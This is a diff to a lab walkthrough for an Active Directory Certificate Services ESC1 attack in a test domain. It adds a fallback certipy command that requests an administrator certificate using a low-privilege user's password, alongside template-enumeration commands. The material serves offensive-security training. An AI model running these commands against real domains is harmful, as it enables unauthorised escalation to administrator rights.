@@ -15,7 +15,7 @@ jdoe (Domain User) → Request Certificate as Administrator → Authenticate wit
 
 Before starting the attack, ensure:
 
-- [ ] All 4 VMs are running (DC, CA, Win10, Attacker)
+- [ ] All required VMs are running (DC, CA, Attacker). Win10 is optional for validating ESC1.
 - [ ] Domain `serini.lab` is created
 - [ ] AD-CS is installed on CA server
 - [ ] Vulnerable template created (run Ansible playbook `playbooks/06-esc1-template.yml`)
@@ -31,6 +31,9 @@ Before starting the attack, ensure:
 **On Kali (192.168.58.50):**
 
 ```bash
+# If certipy was installed with pipx, ensure it's in PATH:
+export PATH="$HOME/.local/bin:$PATH"
+
 # Find all certificate templates and check for ESC1
 certipy find -u jdoe@serini.lab -p 'Summer2024!' -dc-ip 192.168.58.10 -vulnerable
 
@@ -85,6 +88,16 @@ certipy req -u jdoe@serini.lab -p 'Summer2024!' \
     -target ca.serini.lab \
     -template VulnUserAuth \
     -dns dc.serini.lab
+```
+
+**If DNS resolution fails** for `ca.serini.lab`, use the CA IP:
+
+```bash
+certipy req -u jdoe@serini.lab -p 'Summer2024!' \
+    -ca SERINI-CA \
+    -target 192.168.58.20 \
+    -template VulnUserAuth \
+    -upn administrator@serini.lab
 ```
 
 **Expected Output:**
